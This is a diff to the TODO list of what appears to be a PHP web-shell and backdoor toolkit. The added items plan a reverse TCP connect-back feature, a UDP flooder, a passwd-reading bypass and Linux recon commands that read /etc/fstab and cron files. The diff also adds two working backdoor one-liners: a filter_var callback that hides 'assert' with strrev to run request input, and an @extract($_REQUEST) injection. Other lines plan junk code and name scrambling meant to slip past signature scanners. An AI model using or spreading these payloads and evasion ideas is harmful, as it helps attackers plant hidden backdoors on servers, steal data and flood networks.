@@ -20,6 +20,8 @@ NEW ITEMS
 
 * 8 - payload generation - started
 
+* 7 - reverse tcp connection feature with all the backconnects xD - https://github.com/epinna/weevely3/blob/master/modules/backdoor/reversetcp.py
+
 * 6 - change read file to download file, make edit file with cancel button, uploader, finish editor, auto deploy upload features such as ysm, downloader
 
 * 6 - Make payloads and functionality for the Software->Apache .. Samba .. etc and more, Payload should attempt to read a bunch of files (possible locations of related files for selected software), concact result, display files names and results in a single rich textbox?
@@ -31,6 +33,14 @@ NEW ITEMS
 * 4 - "Junk code / random code" feature to the backdoor generator, splits code up, places random meaningless operations in between needed operations to defeat - "sig/byte" scan's
 
 * 4 - make a "super fug sigs" function that scrambles function names like "include", "eval", "get_stream_contents" into random static arrays
+
+* 4 - password feature?
+
+* 4 - Implement posix get posix_getpwuid function for linux getpasswd bypass, use a prompt to get use input for loop size
+
+* 4 - Implement UDP flooder
+
+* 3 - linux info, "cmd" - mount, && cat /etc/fstab && ls -la /etc/cron && ls -aRl /etc/cron* (writeable/we will display color green/red/grey etc when showing), 
 
 * 3 - make disable error reporting a cfg/xml loaded var/ changable in the ("settings") to appernd error reporting onto every request, same for execution time?
 
@@ -47,3 +57,14 @@ NEW ITEMS
 * 1 - move browserview from a form to a Dynamic "Prompt", reconsider the name "Prompt"
 
 * 1 - if click CWD (link) on info page make it pull that up in the filebrowser
+
+* 1 - make timeout 6 seconds on ping
+
+*** Possibly new backdoors type examples 
+
+filter_var($_REQUEST['test'], FILTER_CALLBACK, array("options" => strrev("tressa")));
+
+@extract ($_REQUEST); ...
+  
+
+  https://github.com/epinna/weevely3/blob/master/modules/audit/_linuxprivchecker/linuxprivchecker.py - helpful system info
